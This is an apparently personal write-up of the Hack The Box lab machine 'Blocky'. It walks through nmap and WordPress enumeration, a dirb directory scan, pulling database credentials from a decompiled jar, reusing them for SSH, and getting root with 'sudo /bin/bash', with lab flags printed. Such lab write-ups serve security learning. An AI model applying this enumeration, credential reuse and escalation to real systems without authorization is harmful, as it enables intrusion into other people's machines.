![image](https://user-images.githubusercontent.com/105310322/187503223-277a4fc5-0ee2-446d-ac4b-d18e9dd8ca8f.png)

### Tools: nmap, dirb, jd-gui

### Vulnerabilities: wordpress, php, credentials


Starting off we have a few open ports. I first tested the ftp login for anonymous but that didn't work. So I tried accessing the website but kept getting issues.

```console
└──╼ [★]$ sudo nmap -sC -sV -A 10.129.67.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 17:57 BST
Nmap scan report for 10.129.67.120
Host is up (0.011s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp?
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp closed sophos
Device type: general purpose|specialized|storage-misc|WAP|printer
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (94%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.16 (93%), Linux 4.2 (93%), Linux 4.4 (93%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 - 4.6 (91%), Linux 3.2 - 4.9 (91%), Linux 3.18 (90%), Linux 3.2 - 3.8 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT      ADDRESS
1   17.78 ms 10.10.14.1
2   16.72 ms 10.129.67.120

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.66 seconds
```

A quick change to my hosts table will fix the redirect and allow us to access the site.

```console
└──╼ [★]$ sudo vim /etc/hosts
```
Add the following to the last line in the file.

```console
10.129.67.120 blocky.htb
```
We have a couple of links on the site including one for a login.

![image](https://user-images.githubusercontent.com/105310322/186245120-6ea699e9-7c27-4529-a551-060309b9656b.png)

![image](https://user-images.githubusercontent.com/105310322/186247909-49521513-6f0b-4ea2-b9c4-31a88c92ef57.png)



Since the login page is running wordpress we can do some enumeration. After running it we find 1 user "Notch". I thought maybe the user had a weak password so I tried a little of that and even tried the lost password section to see if I could capture something there. No luck. So lets see if dirb finds anything else.

```console
└──╼ [★]$ nmap -v --script http-wordpress* blocky.htb -p 80
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-23 19:31 BST
NSE: Loaded 3 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:31
Completed NSE at 19:31, 0.00s elapsed
Initiating Ping Scan at 19:31
Scanning blocky.htb (10.129.67.120) [2 ports]
Completed Ping Scan at 19:31, 0.02s elapsed (1 total hosts)
Initiating Connect Scan at 19:31
Scanning blocky.htb (10.129.67.120) [1 port]
Discovered open port 80/tcp on 10.129.67.120
Completed Connect Scan at 19:31, 0.00s elapsed (1 total ports)
NSE: Script scanning 10.129.67.120.
Initiating NSE at 19:31
Completed NSE at 19:31, 8.24s elapsed
Nmap scan report for blocky.htb (10.129.67.120)
Host is up (0.018s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-wordpress-users: 
| Username found: notch
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
| http-wordpress-enum: 
| Search limited to top 100 themes/plugins
|   plugins
|     akismet 3.3.2
|   themes
|     twentyfifteen 1.8
|     twentysixteen 1.3
|_    twentyseventeen 1.3
```


The dirb reveals alot of info. With most of them not meaning much I finally got some headway in the /plugins section of the site that led to 2 jar files.

```console
└──╼ [★]$ dirb http://blocky.htb /usr/share/dirb/wordlists/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Aug 23 19:48:05 2022
URL_BASE: http://blocky.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://blocky.htb/ ----
==> DIRECTORY: http://blocky.htb/javascript/                                   
==> DIRECTORY: http://blocky.htb/phpmyadmin/                                   
==> DIRECTORY: http://blocky.htb/plugins/                                      
+ http://blocky.htb/server-status (CODE:403|SIZE:298)                          
==> DIRECTORY: http://blocky.htb/wiki/                                         
==> DIRECTORY: http://blocky.htb/wp-admin/                                     
==> DIRECTORY: http://blocky.htb/wp-content/                                   
==> DIRECTORY: http://blocky.htb/wp-includes/                                  
                                                                               
---- Entering directory: http://blocky.htb/javascript/ ----
==> DIRECTORY: http://blocky.htb/javascript/jquery/                            
                                                                               
---- Entering directory: http://blocky.htb/phpmyadmin/ ----
==> DIRECTORY: http://blocky.htb/phpmyadmin/doc/                               
+ http://blocky.htb/phpmyadmin/favicon.ico (CODE:200|SIZE:22486)               
==> DIRECTORY: http://blocky.htb/phpmyadmin/js/                                
+ http://blocky.htb/phpmyadmin/libraries (CODE:403|SIZE:305)                   
==> DIRECTORY: http://blocky.htb/phpmyadmin/locale/                            
+ http://blocky.htb/phpmyadmin/setup (CODE:401|SIZE:457)                       
==> DIRECTORY: http://blocky.htb/phpmyadmin/sql/                               
==> DIRECTORY: http://blocky.htb/phpmyadmin/templates/                         
==> DIRECTORY: http://blocky.htb/phpmyadmin/themes/                            
                                                                               
---- Entering directory: http://blocky.htb/plugins/ ----
==> DIRECTORY: http://blocky.htb/plugins/assets/                               
==> DIRECTORY: http://blocky.htb/plugins/files/                                
                                                                               
---- Entering directory: http://blocky.htb/wiki/ ----
                                                                               
---- Entering directory: http://blocky.htb/wp-admin/ ----
==> DIRECTORY: http://blocky.htb/wp-admin/css/                                 
==> DIRECTORY: http://blocky.htb/wp-admin/images/                              
==> DIRECTORY: http://blocky.htb/wp-admin/includes/                            
==> DIRECTORY: http://blocky.htb/wp-admin/js/                                  
==> DIRECTORY: http://blocky.htb/wp-admin/maint/                               
==> DIRECTORY: http://blocky.htb/wp-admin/network/                             
==> DIRECTORY: http://blocky.htb/wp-admin/user/                                
                                                                               
---- Entering directory: http://blocky.htb/wp-content/ ----
==> DIRECTORY: http://blocky.htb/wp-content/plugins/                           
==> DIRECTORY: http://blocky.htb/wp-content/themes/                            
==> DIRECTORY: http://blocky.htb/wp-content/uploads/                           
                                                                               
---- Entering directory: http://blocky.htb/wp-includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
---- Entering directory: http://blocky.htb/javascript/jquery/ ----
+ http://blocky.htb/javascript/jquery/jquery (CODE:200|SIZE:284394)            
                                                                               
---- Entering directory: http://blocky.htb/phpmyadmin/doc/ ----
==> DIRECTORY: http://blocky.htb/phpmyadmin/doc/html/                          
                                                                               
---- Entering directory: http://blocky.htb/phpmyadmin/js/ ----
==> DIRECTORY: http://blocky.htb/phpmyadmin/js/jquery/                         
==> DIRECTORY: http://blocky.htb/phpmyadmin/js/pmd/                            
==> DIRECTORY: http://blocky.htb/phpmyadmin/js/transformations/                
                                                                      
```  

Using ```jd-gui``` from the terminal will open the program and we can open blockycore.jar.
It is a small file that reveals a sqlpass and sqluser.

![image](https://user-images.githubusercontent.com/105310322/186242875-61349b7a-819b-4972-958f-88b233bcfbff.png)


Since there was an ssh port open we can try that first. Root doesnt work so I try notch instead and we get in and can cat that sweet sweet user flag.

```console
└──╼ [★]$ ssh notch@blocky.htb
The authenticity of host 'blocky.htb (10.129.67.120)' can't be established.
ECDSA key fingerprint is SHA256:lg0igJ5ScjVO6jNwCH/OmEjdeO2+fx+MQhV/ne2i900.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'blocky.htb,10.129.67.120' (ECDSA) to the list of known hosts.
notch@blocky.htb's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Fri Jul  8 07:24:50 2022 from 10.10.14.29
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt
0f10d469927782d02fa148d543bdb3ab
notch@Blocky:~$ 
```
Whenever I get into a machine as a user I always like to check my sudo permissions. This 1 was a suprise since it can run everything as sudo. 1st time for everything on HTB.

By running an easy sudo /bin/bash we quickly become root and cat the root flag!

```console
notch@Blocky:~$ sudo -l
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:~$ sudo /bin/bash
root@Blocky:~# 
```
```console
root@Blocky:/root# ls
root.txt
root@Blocky:/root# cat root.txt
46ea558791cc4b4319e8eb4860b37c64
root@Blocky:/root# 
```

GG!!
